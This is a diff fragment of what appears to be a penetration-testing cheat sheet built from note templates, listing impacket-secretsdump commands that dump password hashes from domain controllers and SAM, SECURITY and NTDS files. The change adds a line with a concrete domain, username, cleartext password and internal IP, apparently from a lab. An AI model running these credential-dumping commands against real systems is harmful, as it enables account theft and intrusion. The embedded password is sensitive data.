@@ -628,7 +628,7 @@ impacket-secretsdump -k <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAM
 impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
 impacket-secretsdump -dc-ip <% tp.frontmatter["RHOST"] %> <% tp.frontmatter["RHOST"] %>.LOCAL/svc_bes:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %>
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
-
+impacket-secretsdump medtech.com/joe:'Flowers1'@172.16.208.11
 
 ```
 
